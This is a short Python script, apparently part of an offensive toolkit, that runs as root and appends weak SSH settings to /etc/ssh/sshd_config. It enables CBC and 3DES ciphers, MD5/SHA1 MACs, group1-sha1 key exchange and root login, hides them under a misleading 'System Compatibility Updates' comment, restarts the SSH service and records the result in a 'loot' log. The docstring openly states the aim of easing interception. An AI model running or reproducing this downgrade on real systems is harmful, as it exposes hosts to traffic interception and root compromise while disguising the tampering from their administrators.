import os
import sys
import subprocess

def downgrade_ssh_security():
    """
    Weaponized Downgrader: Modifies sshd_config to permit 
    insecure ciphers and MACs for easier external interception.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Modifying system security protocols requires UID 0.")
        sys.exit(1)

    config_path = "/etc/ssh/sshd_config"
    backup_path = "/etc/ssh/sshd_config.bak"

    print(f"[*] Targeting {config_path} for cryptographic degradation...")

    # Legacy insecure options to inject
    # 1. Allow legacy CBC ciphers (vulnerable to padding oracle attacks)
    # 2. Allow weak HMACs (MD5/SHA1)
    # 3. Permit root login (if not already enabled)
    weak_configs = [
        "Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc\n",
        "MACs hmac-md5,hmac-sha1,hmac-sha2-256\n",
        "KexAlgorithms diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha256\n",
        "PermitRootLogin yes\n"
    ]

    try:
        # Create a backup for internal Chimera restoration later
        if not os.path.exists(backup_path):
            subprocess.run(["cp", config_path, backup_path], check=True)

        with open(config_path, "a") as f:
            f.write("\n# System Compatibility Updates\n")
            for entry in weak_configs:
                f.write(entry)

        print("[*] Restarting SSH service to apply weak protocols...")
        subprocess.run(["systemctl", "restart", "ssh"], check=True)
        
        print("[!!!] SUCCESS: SSH security downgraded. Interception now viable.")

        # Log to project loot
        loot_path = "../../../loot/forensic_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: PROTOCOL_DOWNGRADE | Target: SSHD | Status: WEAKENED\n")

    except Exception as e:
        print(f"[-] Downgrade Fault: {e}")

if __name__ == "__main__":
    downgrade_ssh_security()
